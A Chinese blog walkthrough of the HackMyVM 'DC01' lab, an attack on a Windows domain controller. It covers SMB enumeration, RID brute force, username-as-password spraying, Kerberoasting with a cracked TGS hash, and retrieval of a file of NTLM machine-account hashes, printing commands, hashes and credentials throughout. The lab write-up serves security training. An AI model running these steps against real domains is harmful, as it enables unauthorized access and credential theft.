---
title: HackMyVM-DC01
published: 2025-03-09 16:23:40
tags: [HackMyVM]
category: 靶机
draft: false
---

# DC01.

> https://hackmyvm.eu/machines/machine.php?vm=DC01
> 

note：**Just enjoy my first Windows DC**

## 信息打点

```c
// 探测主机
nmap -sP 192.168.56.0/24           
Starting Nmap 7.94SVN ( https://nmap.org ) at 2025-01-19 01:47 EST            
Nmap scan report for 192.168.56.1      
Host is up (0.00050s latency).         
MAC Address: 0A:00:27:00:00:09 (Unknown)                                      
Nmap scan report for 192.168.56.2      
Host is up (0.00041s latency).         
MAC Address: 08:00:27:FB:9B:E7 (Oracle VirtualBox virtual NIC)                
Nmap scan report for 192.168.56.128    
Host is up (0.00036s latency).         
MAC Address: 08:00:27:41:A7:DA (Oracle VirtualBox virtual NIC)                
Nmap scan report for 192.168.56.4
// 扫描主机所有端口
nmap -sT -min-rate 10000 -p- 192.168.56.128                               
Starting Nmap 7.94SVN ( https://nmap.org ) at 2025-01-19 01:58 EST            
Nmap scan report for 192.168.56.128                                           
Host is up (0.00078s latency).         
Not shown: 65517 filtered tcp ports (no-response)                             
PORT      STATE SERVICE                
53/tcp    open  domain                                                        
88/tcp    open  kerberos-sec           
135/tcp   open  msrpc                  
139/tcp   open  netbios-ssn                                                   
389/tcp   open  ldap                   
445/tcp   open  microsoft-ds           
464/tcp   open  kpasswd5                                                      
593/tcp   open  http-rpc-epmap         
636/tcp   open  ldapssl                
3268/tcp  open  globalcatLDAP                                                 
3269/tcp  open  globalcatLDAPssl       
5985/tcp  open  wsman                  
9389/tcp  open  adws                                                          
49664/tcp open  unknown                           
MAC Address: 08:00:27:41:A7:DA (Oracle VirtualBox virtual NIC)
// 版本探测以及系统版本探测
nmap -sT -sV -O -p- 192.168.56.128                                        
Starting Nmap 7.94SVN ( https://nmap.org ) at 2025-01-19 02:02 EST
Nmap scan report for 192.168.56.128                                                                                                                          
Host is up (0.00067s latency).                                                
Not shown: 65517 filtered tcp ports (no-response)                             
PORT      STATE SERVICE       VERSION                                         
53/tcp    open  domain        Simple DNS Plus
88/tcp    open  kerberos-sec  Microsoft Windows Kerberos (server time: 2025-01-19 22:04:08Z)                                                                 
135/tcp   open  msrpc         Microsoft Windows RPC                           
139/tcp   open  netbios-ssn   Microsoft Windows netbios-ssn                   
389/tcp   open  ldap          Microsoft Windows Active Directory LDAP (Domain: SOUPEDECODE.LOCAL0., Site: Default-First-Site-Name)                           
445/tcp   open  microsoft-ds?          
464/tcp   open  kpasswd5?              
593/tcp   open  ncacn_http    Microsoft Windows RPC over HTTP 1.0             
636/tcp   open  tcpwrapped             
3268/tcp  open  ldap          Microsoft Windows Active Directory LDAP (Domain: SOUPEDECODE.LOCAL0., Site: Default-First-Site-Name)                           
3269/tcp  open  tcpwrapped             
5985/tcp  open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)         
9389/tcp  open  mc-nmf        .NET Message Framing                            
49664/tcp open  msrpc         Microsoft Windows RPC                           
49667/tcp open  msrpc         Microsoft Windows RPC                           
49674/tcp open  ncacn_http    Microsoft Windows RPC over HTTP 1.0             
49687/tcp open  msrpc         Microsoft Windows RPC                           
49707/tcp open  msrpc         Microsoft Windows RPC                           
MAC Address: 08:00:27:41:A7:DA (Oracle VirtualBox virtual NIC)                
Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port                                                        
Device type: general purpose           
Running (JUST GUESSING): Microsoft Windows 2022|11|2016|10 (95%)              
OS CPE: cpe:/o:microsoft:windows_server_2016 cpe:/o:microsoft:windows_10      
Aggressive OS guesses: Microsoft Windows Server 2022 (95%), Microsoft Windows 11 21H2 (91%), Microsoft Windows Server 2016 (91%), Microsoft Windows 10 (86%) 
No exact OS matches for host (test conditions non-ideal).                     
Network Distance: 1 hop                
Service Info: Host: DC01; OS: Windows; CPE: cpe:/o:microsoft:windows
```

分析：可以看到该靶机存在`53，88，445`端口，推测该靶机是DC，存在445端口也可以枚举

## 渗透

### SMB

没有任何频凭据，所以只能首先查看SMB里共享了什么

```c
smbclient -L 192.168.56.128
Password for [WORKGROUP\root]:

        Sharename       Type      Comment
        ---------       ----      -------
        ADMIN$          Disk      Remote Admin
        backup          Disk      
        C$              Disk      Default share
        IPC$            IPC       Remote IPC
        NETLOGON        Disk      Logon server share 
        SYSVOL          Disk      Logon server share 
        Users           Disk      
Reconnecting with SMB1 for workgroup listing.
do_connect: Connection to 192.168.56.128 failed (Error NT_STATUS_RESOURCE_NAME_NOT_FOUND)
Unable to connect with SMB1 -- no workgroup available
```

尝试都去访问一边，使用空密码，挺多可以进去的

```c
┌──(root㉿kali)-[~/Desktop/test/DC01]  
└─# smbclient //192.168.56.128/ADMIN$
Password for [WORKGROUP\root]:                                                
tree connect failed: NT_STATUS_ACCESS_DENIED

┌──(root㉿kali)-[~/Desktop/test/DC01]
└─# smbclient //192.168.56.128/backup                                         
Password for [WORKGROUP\root]:
Try "help" to get a list of possible commands.
smb: \> 

┌──(root㉿kali)-[~/Desktop/test/DC01]                                                                                                                 [0/229]
└─# smbclient //192.168.56.128/C$                                             
Password for [WORKGROUP\root]:                                                                                                                               
tree connect failed: NT_STATUS_ACCESS_DENIED                                                                                                                 
                                                                                                                                                             
┌──(root㉿kali)-[~/Desktop/test/DC01]                                                                                                                        
└─# smbclient //192.168.56.128/IPC$                                           
Password for [WORKGROUP\root]:                                                                                                                               
Try "help" to get a list of possible commands.                                                                                                               
smb: \>                                                                                                                                                

┌──(root㉿kali)-[~/Desktop/test/DC01]                                         
└─# smbclient //192.168.56.128/NETLOGON                                       
Password for [WORKGROUP\root]:                                                
Try "help" to get a list of possible commands.                                                                                                               
smb: \>                            
                                                                           
┌──(root㉿kali)-[~/Desktop/test/DC01]  
└─# smbclient //192.168.56.128/SYSVOL  
Password for [WORKGROUP\root]:       
Try "help" to get a list of possible commands.                                
smb: \>                                                                

┌──(root㉿kali)-[~/Desktop/test/DC01]
└─# smbclient //192.168.56.128/users                                          
Password for [WORKGROUP\root]:
Try "help" to get a list of possible commands.
smb: \> 

```

但是能读取只有`IPC$` ，但是里边什么都没有

```c
smbclient //192.168.56.128/IPC$
Password for [WORKGROUP\root]:
Try "help" to get a list of possible commands.
smb: \> mget
nothing to mget
```

### 用户信息枚举

使用`impacket`工具包里边的**lookupsid**

通过nmap扫描我们可以知道域是`SOUPEDECODE.LOCAL0.` 将结果存为`user.txt`

```c
lookupsid.py SOUPEDECODE.LOCAL0./anonymous@192.168.56.128 > user.txt
```

编写脚本将用户名提取出来，保存为`username.txt`

```python
with open('user.txt','r') as file:
    data = file.read()
    lines = data.splitlines()
with open('username.txt','w+') as file2:
    for line in lines:
        file2.write(line[line.find('\\') + 1:line.find('(')-1] + '\n')
```

### SMB 爆破

使用`Crackmapexec`进行`smb`爆破

```python
crackmapexec smb 192.168.56.128 -u username.txt -p username.txt --continue-on-success --no-bruteforce | grep + 
```

得到一组凭据

```python
SMB     192.168.56.128  445    DC01       [+] SOUPEDECODE.LOCAL\ybob317:ybob317
```

尝试使用`smbexec`登录但是提示`access denied`

```python
smbexec.py SOUPEDECODE\ybob317:ybob317@192.168.56.128 
Impacket v0.12.0 - Copyright Fortra, LLC and its affiliated companies 

[-] SMB SessionError: code: 0xc0000022 - STATUS_ACCESS_DENIED - {Access Denied} A process has requested access to an object but has not been granted those access rights.
```

使用`smbclient` 

```python
smbclient //192.168.56.128/users -U SOUPEDECODE.LOCAL/ybob317%ybob317
Try "help" to get a list of possible commands.
smb: \> dir
  .                                  DR        0  Thu Jul  4 18:48:22 2024
  ..                                DHS        0  Mon Jun 17 13:42:50 2024
  admin                               D        0  Thu Jul  4 18:49:01 2024
  Administrator                       D        0  Sat Jun 15 15:56:40 2024
  All Users                       DHSrn        0  Sat May  8 04:26:16 2021
  Default                           DHR        0  Sat Jun 15 22:51:08 2024
  Default User                    DHSrn        0  Sat May  8 04:26:16 2021
  desktop.ini                       AHS      174  Sat May  8 04:14:03 2021
  Public                             DR        0  Sat Jun 15 13:54:32 2024
  ybob317                             D        0  Mon Jun 17 13:24:32 2024
```

### UserFlag

```python
smb: \ybob317\Desktop\> get user.txt 
getting file \ybob317\Desktop\user.txt of size 32 as user.txt (0.9 KiloBytes/sec) (average 0.9 KiloBytes/sec)
```

```python
// cat user.txt
6bab1f09a7403980bfeb4c2b412be47b 
```

获取到userflag后，继续朝着root去

### kerberoasting

但是该用户不允许直接通过`smbexec`等工具获得命令行，并且我们知道靶机开着88端口，就是`kerberos`的验证服务，我们可以尝试获取该用户的`SPN`然后进行`kerberoasting`

`kerberoasting`本质上就是破解TGS票据，TGS票据使用服务HASH来加密的

首先第一步就是获取用户`SPN` ，使用`GetUserSpn.py`

```python
GetUserSPNs.py SOUPEDECODE.LOCAL/ybob317:ybob317 -dc-ip 192.168.56.128 -request
Impacket v0.12.0 - Copyright Fortra, LLC and its affiliated companies 

ServicePrincipalName    Name            MemberOf  PasswordLastSet             LastLogon  Delegation 
----------------------  --------------  --------  --------------------------  ---------  ----------
FTP/FileServer          file_svc                  2024-06-17 13:32:23.726085  <never>               
FW/ProxyServer          firewall_svc              2024-06-17 13:28:32.710125  <never>               
HTTP/BackupServer       backup_svc                2024-06-17 13:28:49.476511  <never>               
HTTP/WebServer          web_svc                   2024-06-17 13:29:04.569417  <never>               
HTTPS/MonitoringServer  monitoring_svc            2024-06-17 13:29:18.511871  <never>               

[-] CCache file is not found. Skipping...
[-] Kerberos SessionError: KRB_AP_ERR_SKEW(Clock skew too great)
```

发现错误，貌似是因为时区问题导致的失败，调整KALI的时间和靶机的相等

```python
rdate -n 192.168.56.128
Sun Jan 19 20:33:37 EST 2025
```

再次尝试，还是不行，还是一样的错误，继续调整时间

```python
cat /etc/hosts
127.0.0.1       localhost
127.0.1.1       kali
192.168.56.128  SOUPEDECODE.LOCAL

┌──(root㉿kali)-[~/Desktop/test/DC01]                                                                                                                        
└─# ntpdate -n SOUPEDECODE.LOCAL                                                                                                                             
ntpdig -s -S -M 500 -t 1 SOUPEDECODE.LOCAL                                                                                                                   
                                                                                                                                                             
┌──(root㉿kali)-[~/Desktop/test/DC01]                                                                                                                        
└─# rdate -n 192.168.56.128                                                                                                                                  
Sun Jan 19 20:38:35 EST 2025  
```

再次尝试，获取到`TGS`票据

```python
GetUserSPNs.py SOUPEDECODE.LOCAL/ybob317:ybob317 -dc-ip 192.168.56.128 -request                                                                          
Impacket v0.12.0 - Copyright Fortra, LLC and its affiliated companies                                                                                        
                                                                                                                                                             
ServicePrincipalName    Name            MemberOf  PasswordLastSet             LastLogon  Delegation                                                          
----------------------  --------------  --------  --------------------------  ---------  ----------                                                          
FTP/FileServer          file_svc                  2024-06-17 13:32:23.726085  <never>                                                                        
FW/ProxyServer          firewall_svc              2024-06-17 13:28:32.710125  <never>                                                                        
HTTP/BackupServer       backup_svc                2024-06-17 13:28:49.476511  <never>                                                                        
HTTP/WebServer          web_svc                   2024-06-17 13:29:04.569417  <never>                                                                        
HTTPS/MonitoringServer  monitoring_svc            2024-06-17 13:29:18.511871  <never>  

$krb5tgs$23$*file_svc$SOUPEDECODE.LOCAL$SOUPEDECODE.LOCAL/file_svc*$019455c504de5eb8e4cb734f4fbc3299$94555f097c6b5bfc3b7af2ea53c00e9f98c5d719b9c21c299f31e2352777858e4bc07462b30b41bb196b667b112a8b0db7e26c68f7aa9c0e38d0cc469b00be4806139dbbda840a02293a39878fb937285f71f211a4575bb15ea398fc17c62716e36828fe70fbc1ee5169d4c19232530aa2a59c5196031ccf38d6a764ebbd691175cc7fe1be73b5a3935b14ea22f721ec17de7fa539c0dbc83b238a81d612609d223f883c4c8201f9317adba1cc34e5deba51ef2d3e2da11fd0d4d4abd17fa10aa4ff7582f963f8954647966c691442b738b9943a32c0db312c245ca0d4e362aa47a469656bef13e380642e2b07767ae2bf95dc9252c910c605811d3fd144303711655806db728b96820b6144c622cde83bc962f41f9d45fdd36e105ec4313704df3738fcfc9be8f75e07397596fa75acc0ebf44e9af14bac8e915f81200b9004c8d65003a750c493d1e64b8897d3566d863111d8fcfa608b557f583ffbaf443e56887b4ce1dc22ce22deaafa9074ddb1c45209571498bb6c2fedbb77bad9f27b2afd521fcf412e5daefcba64f83deead8d8c626fe93850df3909ad06b81ef2f6b4527c357a0d3356b52501ac706c9fc4b89e920ba0792a52fead66e17cf4ea2a4dfbbfc65afe29642cc70a624ed4450073279b5587a2705b3efc1a6ecb3b85fb77f33152f24b7f44b1690115e285c95e99fca867427b6d39fa171b9d104c197b02f3b8e79d31cddc6c27d760a2df58d99bf86cf30a9be2b83042d7beb31fd68ac6e545960f5af76c10c6d92c1bd2523b1de5a6d57e80c140c1f0160e9303e30fc8f3a93592a3cb142353a4719bbe836441c7047e4d0cef8c988d4143cc924f8f02c219c9c3637b9332c1e3b10b995a1c006b5310076502072211149e4d067d0a36595b92afa94772726471dd5a90f596033d03f21bc6a920dbac64e34a3f74f6dc7426ae0eb31edad81221c7bcc59cbe40b07268ea12d1695b645b1abec582d29231968c1f325062cf22625257f2273123ed74c1b5979dce2655764f77f03d2b4bcafb0c14c30f41f578d17af2c3a8e1f1313cb89225d52ef68ee868d5b2e57a89f2d3421fbea8898156ad86705d6131a2cfb0e714a7f72d989a873d807986cd2391d4ff59133df5b6531fc4463cede7596d9f9017c75e9b876e60c63904d6eec5c69fe35f54b1d06d414c703a59cff8163ec569e232e46578453531f3fda7381faf7683397bb7fc08c9c51a4051d2130d23b1d5bc832bd1826a812ed20d319bb509522f31ef35806f82b57db423f4f7da7438878282992f60df3936d7a6ba0a70c036c8c9ac0329d79b2e4611abb7b39c8229fd65d4518bf57b504be9ed18c39c8c0a60b2b75b243cb996331761edfb2c5f798b9c1343c4ed61d1ecca61642a15adaee618286cf49c4d6ff2c04678cbeb7bf45474a9e0065c829f9af7e0fc03c5dbaecb16167561674abdab51f84a209fbf20c4dc567f0dc47d18d30ff8c61a48
$krb5tgs$23$*firewall_svc$SOUPEDECODE.LOCAL$SOUPEDECODE.LOCAL/firewall_svc*$d834c5f69212f72457e69cee155415b5$889f17466fbad72e22cad3d1c2291b232d8a38cfe714d1f741f7d437664159cd1211cfe9d5df6a5eb3c6a32504c678f21c35e5b26753dab37ebeb1b34623501a78f4b911dd72ff7445da8e979fe9a48e677cd4f3d88e06e91ed26cdfd518582ea3aaa157e65a92525e370a78fd82135e3883719fbab32ebf3babc7be47a4ff7b55a43eb6ae5b3183f12867ec0f66de9e810a4c4b823192b347de7bd4cd2bbfaab7ff9aeacee95476a35dc46f6551327e0379ed8e4bc18e9db58a07a013b21e0889fd74973b496bbea58f9bd0adb961c4f0aceee9de66e0a561f369694d13101edf6f8958d8fd3d8c2d527fc1650c304a0ce1419fe7c4843d28f75c6a37b6429aca1109e8faadce30c624dcbc970f0a8b063b334e5ee003908232af1761f0ae1635d2a308f62ab1070a33e16859203c376ef2ac9c256897e9243fcf9cdf36d9ac2d64b9c6382436fd55631bb6e5a089b28f7388dfb0cdd8a9437dcd39e59a80997c91f798867594e1aaf34121b535c693eb2fffe969cddedca24b4758420002d0e18ba0d21ef36102c79ff55528155acf55c1beacf7c9dd2eea10703021b9f809518d93a37693045f840d1531e91a932be5d03fb0ea7731e365efc9eff58a7793da8b0a2ac3f45994284f2b5dabff8c0641cf93d05bcb8b3845c4ff872a40d4746d662e23917da773b6870488dd97bdbc366d209b456217abefe7edfa26f208fd7fae277394adf5bebd67d8c3cfafc7d04320383e756db70c10f582714006e11344f1eca2bdf1f493fc228fd5041e204eafe8975b958823c51f400877333749ba6eaf3fea20f6a1af22ca5a0e139af19fb24696b3eba78ff1b9a73042b159d6b41844e03872cc2dad2f5c1ffd5bf7c39cf6ac9655c1f324f2aaea1aeb1e01aa5754a6b807d9fcc5ab67f410675c74a4bb04cb198552ee1391d1ffa46dfb79aa75558e4e75781fabe3de599590bd355fd57e722f6c5345bb5e07a5ef6e3ac1ccb90c2e466eeac788d1bd2236ac9c1b4f018cb0c212b2d4d4b24eec2979b95a8ccffe4e5c3980913d373ff36d32c7f2b7e4bb3d57bf1e17a13c32436192bcf0a298a52c215da0434ccedd810b0f7cd5e3c65fdc1e3217b54a6f3f2d838db3cc03c993cac265d29ac0cd1310f56d73afb21f01bdf4b701b06f2f4fd01b6b867d1ad86e629f63dc913c76c323501b55aac8a4fba2f9397d8c3da6541b6222a45366b2928f42fe523d270107b0bb9f5a2f5d89e10f7752e850e442c69487d4ebc7a214e85e8f58f4c631e84cfea6b2a684cb8d600bb2c6de1399e471f08ec5065feae2597169cbc4f7ab1870e77b0277735400751f2b2186ccfba59c0620988133edef0337552477af84a3bf48309afa6ee2a7e1dc3df732b649a44f8a3a24898bcbe85a9a112283515676125f90eefd5b77f98f64ceeb0bb5484c56cf0839d7a4d912b02c2057a54eb438aa07ef4aa9c0ab99f43d3ff932f27bf7c9f5042b6fcc3f8944
$krb5tgs$23$*backup_svc$SOUPEDECODE.LOCAL$SOUPEDECODE.LOCAL/backup_svc*$bfed86a70449bbde84df73d19b4c7730$5d83b78b8915dc4d7c3a82f08a30ef4fc8eccc08bdfa4af50c14ed5c5ae2184c7bbc1e03677dded3c9acbde601f9197e0563e3df62de7770348f058ecdf8f34581868bb405f028b1084759abf00d76428070faf55c2d329427b7e88d38551d2601bf492a01942c7b06211303a20084226d9f2becc8250de0f011f0f85d45c5591b2ffbaa84252fcaad6e0c9ba7b95cdab95eab6476121d29f701d42932a45fd67c8ee604405b1a66c3ecf7cd92de23c7872c90343093a6f8ce52c6f5179800e731b6684592a96c7d80b0e74d3bf7cb30120ef1d119c8befdea04b7184c660c7988c44452deb5d0cf925943b78aa533fd8038ffd6a6f6e065abe539d1108cc8db6d88ce552a0d6dc2e594c34a958080d34fffd474d8339a32612236b942204149b71dc5430d456d1669a789ff99aa3da173155f4ff73b82800a967289dbb6a78d5e47a826a3d3abf3d6b4c76a442113c19f5d2241b60535d4daf79983d177ea31af42c9faf97dc59481c94cc16b0f0d02af8213b2392113195fa5533a9aa4a2ea5d67d3dd43c905549883c2639f8ebbc7c7dd856a33d8c61abd5936574cd66d4e99b3193819e08bcc0a7c75f4ef7da86a773065b1b859119106d2b46fae158d9aa58e298c2ba97e032bd75b31dd13fe138e63aa021aa401fc455a46f00f4acf4209da6bdcf4a21fa104f7717a7fbd55f7e0aea0735e7aac3cfab70571f2892c67fc83310b3d0c3fb83bae60f82afa3fd5fffe410bc4c33414bdd9008c99342acefb2ef9062c3f1459df8d927ce006967f874ef6b18cf2704296cffb5b5d630ba97de9f8ae7c18821c59a79ea3e46dfa668c781ddf459795f2e71ca8387b41416ce973fccc032adb326cb2af4746440bf01ed2e258980e0296843beabd1089129d1b42b4d1d08f2fde26b95f6983a83af0c39c5db37326f28693ea5ff30f587db1faac0e82a5acb38259f9d3a853640b18806a2cc1007b75c5cd53c82668e39c31d0c6112a13ca6a5ce4d78e4e9418a984e0401209b7e9ed4896ef5f1623db640e45bbf366deadbc841b5738ac9b54d7a1e3a573c9a971db09ff4b3d81b974209df0f038927edcc1c47dcd11e27d18266567b3b134a742a064c5d51c9d15ff19e2a354f7475f5bb10b92e659286b6f1b4d9e54b975f22e6fda5c8ccdd3b8afc437d4c187dfa3abd09bb640388c40fc1cdf78b8736898bdd755d333554bf088c27dedcc2cff91ffa08cc1cd3490ca9e5d42e12aea71bbd0b378f60e398ebf16964f5faad3dbd26f0ae8113191ac4aa25f97ef2ad4a0aa6fc6e736bec6c9cab9257e89c36d439e07e03bdae6e327b7eb4208290120ba2628c02073ad64700022efdcdf21cca7dcc7cb9b91fb72a654da13d83feee2f2afc0c1ccb16f17bce2de0b8211cbee77392cf32ca3c82c7deef6f43dba9aa7bb655ce5d6cde0beb50bec72037f6c20b3797a71e1a33a8be8116c4d807e08afeb2b9dd4c6e09a416baa7c619a9d
$krb5tgs$23$*web_svc$SOUPEDECODE.LOCAL$SOUPEDECODE.LOCAL/web_svc*$f81f76f5ea4e5729583d87b18454ddb8$da8b62c1777dc2b29040d0b0ed1d78cda4427f2ed66f05529cdd964f0ac8946e1128c4a7466224e5324c3402515fe8799f6c43a1cc9ab2395e59937a6d1490067a13e8f6bfe3bb6cc041dbaee70cd28ed36e42c29f1fabcc11708c36d5b4fed93bb64f83db8632a082847ae39a5cb198973b3c6eee7fed46a4e23b5d614b289b7784887fffabfc1e450e2a270d0625a582725f71b99b596fc152d96de336f1fef90e1246223ca6f6c8d1095df65b0e0ed2907d172587c4271aa141d22d485a65028c0494f9c382ddac4a506362b1d5f153a51c632e0be7ef373a70dff482933dbaf25dcac873311fe22d64f4bfa3040bc1d6784c6156d056fafc23b3fd396702b065969f0c9e6909b285c183efb72e1678ebea3d53c45db191116c84276d37979b958270be709ecca7c70c41523c97bfb32449322932876fcc0d6a0832a0050e99e582aa49607d60aad48befef8de772be267842bb8e29ac6a381e8fcfec86ff191bdc18f00e4869549f0382a7acc03a9ae361908e854458446728ba97cf71f49630d93663f43dd9ea228824c7d4be9e6d6df4ae1b6c5fec14ef28d438b098b9277f106d9c2b6722ccf5444286f6c50c6a447fadbcebb4819f29a48d8d09427c0aeb97f472e63cb1940837b310ada3eefb661ead053462b960e38518fc1d333652c58e888a912f4f94ee3fcdd1ddd677698e62a58d809ec74176fb0fc1b2c567b2c722f666a2ec88570535dadd15fc0f973ca2c539d12fe4b95f2759f3de7560975195bbfe10eaa070e327672fa1ad65bd75dfa04618ba9ff8d7f1e360410caecef657198f809bc7d955c19657f8787be7037c570b8771bb10d9d0c77d0ca383f2bfc2933c418c85de2d188f9ad7e9af74d9461cdd64be67ae6eab8edcd883426071a09e61e5fd3393dfe58322e80563d9a2be3373bd99617d79f19caba515af375a820f58bf589e46b03c711ec649bab91b8b6e5917de0396c80e5041e66a498575a2df38fe8af550a5d38983e23229bad9f81ab96e1ba22acc9b508636c81a59b646d31bdd2c14e446b37b99f50a5cac11163401902774f8f1e0837957385ad24e962b7d6c6f8dfd7fbc8950bad94f97922173d52ab058fa08ad6c15a711931fb185c2f87dd1345c94f2e66d30b9ef0b541afb5ab675cc3c555170b3db2f59373bc1406cf0f4dda06ed41b516695add5ca472b0c05140a577cf2ec9587bd209583ef9336772e00a2e69a15a3f247a00a386ba3848e9489a29024d4714ae92814efb3d0912494ec57a20a408e8f2a55017d0cc3b0df29777490b7f8acd090dacae1c4165191aa18504d0eec64eb7378e4a26b1aebc1fa555502eddf82e12e71be8aadbc3d6d0c862ea6ac75d503f35738ff01660bcb4b2bbbc2d2fcb80c87cbecf9e71febcfed4bd5a503cd07e5a40adefdf42137fbfdcd94350aab20b8cd033ff56af4d964cffbf7e2a910b7c22196f8ab202e2ed68a8ea54ce9c79e43672675
$krb5tgs$23$*monitoring_svc$SOUPEDECODE.LOCAL$SOUPEDECODE.LOCAL/monitoring_svc*$1eb741cbc56c2a8779a88689122bfb7e$9913963c816db0c9bcb9091c5234573ace76790f03a5eb329be671d8c41a26853aaf8615c24a62b6d6ad35d41649c4bbbc5fff0d7587281ac3cd725086c57691469789346f0451823a52e49cfc5d9f83bf9c71e0e5d52d45defce23b9e534694b9673bcc554ec36a6e5b0342780e3238d4b8272458748b73cccc59727578021a7bc8d69a713293884bfa5e4105ae1e60767de187a240cda214b5eb2d544143bb0e21efd8054e33c280726aa18ca441bfe41ac2e663fc9a1e26f1e42bf1148b57e842686bb2a2eb0b7cf8a943c72bbd6924da8a6c630794af8652da77da839cf8b2f633dae5ee9bf84816b0b96e25acd3354a2ee56ef24b1633ccf6aa46ce91ca23db5aca5813682168b314534eee6081bd44669cb7c0a2cb73a4349b92dc9dc58f2963d7847a80449e4c70b2647d8d586569333a5b42b75741e0a5670bd14d753f4f45264a8c26693bb04a2df8dd75e7c8e5c8bbab8b68474a94efe1315692aa716169ae354acf1b4299b35706e3897977e390ad052940e92c72e2d70d195f9837348ecfb477d4d2b4bda16e4e532452d0e8426d222f113c4f85f3c51a8d3f7e61d95040162a5fd5d589a64b5ba7a35571aee68d70c0adce931167db2ff05be14610f327425af7530558da29759afc5b3a7ec2bed7dee68991c3ec2615260e7b9c60825e3b6e071c45b34021c7be82e33771f2d005b8cdf273fe15e3832aacfdc0c086fa1ff4ee8b277fc1a86e9929d6263baffe277842050a7e1d3cd32dc2edf15480f28c6aaee8213b0b9ed9e4ac8e4f5d5073778f16d89587ab92c17676b5366cfdcbcd1d36e9196bf704e37a6fdde0adecb69913eac89a92621aa9f7ed9bd22c02b1d26a8b1ee44f4a0650090f36ee959b990184f596c5962a6ceea33a3b2b6839dc10ff7eaa442087ba9b72ef6227d46d5f514d98df2edf03a29905cc8034d013e002b4f4f752b87cc7d40b54bb585d0641c7a4cef5365e76aabb146aedf962bb1aecf9974b647fe26e9f2ae02b52f139f4e1b8bae778a3b5e366f9f5e51c2f98c9284ec26080ef89be6493d1181f834d19c78bac5cb042f8bc37d6c211988415b96c6c0233136b3c39e8b0d93739ce81164617dc545ae8e533cc9d3812026484da9b74d0327b575eea8d318a1c6c6a92e0f0b4a6adac1fdb27f9d7255fd6cfefd4375908aac8f76c979b6e22fcb123f2e99993ee0428624b18a06e62ee7500322cb8c6b9784311f694fb53c3e37de0ef03ef852789ed717bd1382c4d447ccf89c30126608fa389adf796fecfd1ce64b54532b17d557c5bc404a9629833684c69bb6f9ab7f7dadeef075db931c0a0b3616c9673792876d2db1f2bd854bf1591121cef252fb7cf33f36fc4e833169efdb3636b43783f26c0f6e64a1b13c67d1e90f5e94bc1ef17775c1dd706ccb578769878a94cf7372851df8719ca467654ca73defe4345a243d6caa1abfd032ae8b5f5f8d09b3c865073cdaee6aa412c85

```

进行破解，使用开膛手，得到密码`Password123!!`

```python
john --wordlist=/usr/share/wordlists/rockyou.txt hash.txt
Using default input encoding: UTF-8
Loaded 5 password hashes with 5 different salts (krb5tgs, Kerberos 5 TGS etype 23 [MD4 HMAC-MD5 RC4])
Will run 8 OpenMP threads
Press 'q' or Ctrl-C to abort, almost any other key for status
Password123!!    (?)     
1g 0:00:00:31 DONE (2025-01-19 04:59) 0.03223g/s 462403p/s 2195Kc/s 2195KC/s !)(OPPQR..*7¡Vamos!
Use the "--show" option to display all of the cracked passwords reliably
Session completed. 
	
```

### 密码喷洒

得到密码后进行密码喷洒，看密码属于哪些个用户

```python
crackmapexec smb 192.168.56.128 -u username.txt -p 'Password123!!' --continue-on-success | grep +
SMB                      192.168.56.128  445    DC01             [+] SOUPEDECODE.LOCAL\Domain Admins:Password123!! 
SMB                      192.168.56.128  445    DC01             [+] SOUPEDECODE.LOCAL\Domain Users:Password123!! 
SMB                      192.168.56.128  445    DC01             [+] SOUPEDECODE.LOCAL\Domain Guests:Password123!! 
SMB                      192.168.56.128  445    DC01             [+] SOUPEDECODE.LOCAL\Domain Computers:Password123!! 
SMB                      192.168.56.128  445    DC01             [+] SOUPEDECODE.LOCAL\Domain Controllers:Password123!! 
SMB                      192.168.56.128  445    DC01             [+] SOUPEDECODE.LOCAL\Cert Publishers:Password123!! 
SMB                      192.168.56.128  445    DC01             [+] SOUPEDECODE.LOCAL\Schema Admins:Password123!! 
SMB                      192.168.56.128  445    DC01             [+] SOUPEDECODE.LOCAL\Enterprise Admins:Password123!! 
SMB                      192.168.56.128  445    DC01             [+] SOUPEDECODE.LOCAL\Group Policy Creator Owners:Password123!! 
SMB                      192.168.56.128  445    DC01             [+] SOUPEDECODE.LOCAL\Read-only Domain Controllers:Password123!! 
SMB                      192.168.56.128  445    DC01             [+] SOUPEDECODE.LOCAL\Cloneable Domain Controllers:Password123!! 
SMB                      192.168.56.128  445    DC01             [+] SOUPEDECODE.LOCAL\Protected Users:Password123!! 
SMB                      192.168.56.128  445    DC01             [+] SOUPEDECODE.LOCAL\Key Admins:Password123!! 
SMB                      192.168.56.128  445    DC01             [+] SOUPEDECODE.LOCAL\Enterprise Key Admins:Password123!! 
SMB                      192.168.56.128  445    DC01             [+] SOUPEDECODE.LOCAL\RAS and IAS Servers:Password123!! 
SMB                      192.168.56.128  445    DC01             [+] SOUPEDECODE.LOCAL\Allowed RODC Password Replication Group:Password123!! 
SMB                      192.168.56.128  445    DC01             [+] SOUPEDECODE.LOCAL\Denied RODC Password Replication Group:Password123!! 
SMB                      192.168.56.128  445    DC01             [+] SOUPEDECODE.LOCAL\DnsAdmins:Password123!! 
SMB                      192.168.56.128  445    DC01             [+] SOUPEDECODE.LOCAL\DnsUpdateProxy:Password123!! 
SMB                      192.168.56.128  445    DC01             [+] SOUPEDECODE.LOCAL\file_svc:Password123!！
```

看样子是用户 `file_svc`

### SMB信息收集

获得新用户后再通过SMB获得信息

经过测试，最后发现`backup`文件夹该用户有权限，并获得文件 `backup_extract.txt`

```python
smbclient //192.168.56.128/backup -U SOUPEDECODE.LOCAL/file_svc%'Password123!!'
Try "help" to get a list of possible commands.
smb: \> ls
  .                                   D        0  Mon Jun 17 13:41:17 2024
  ..                                 DR        0  Mon Jun 17 13:44:56 2024
  backup_extract.txt                  A      892  Mon Jun 17 04:41:05 2024

                12942591 blocks of size 4096. 11051255 blocks available
smb: \> get backup_extract.txt 
getting file \backup_extract.txt of size 892 as backup_extract.txt (32.3 KiloBytes/sec) (average 32.3 KiloBytes/sec)
smb: \> 

┌──(root㉿kali)-[~/Desktop/test/DC01]
└─# cat backup_extract.txt                                                                           
WebServer$:2119:aad3b435b51404eeaad3b435b51404ee:c47b45f5d4df5a494bd19f13e14f7902:::
DatabaseServer$:2120:aad3b435b51404eeaad3b435b51404ee:406b424c7b483a42458bf6f545c936f7:::
CitrixServer$:2122:aad3b435b51404eeaad3b435b51404ee:48fc7eca9af236d7849273990f6c5117:::
FileServer$:2065:aad3b435b51404eeaad3b435b51404ee:e41da7e79a4c76dbd9cf79d1cb325559:::
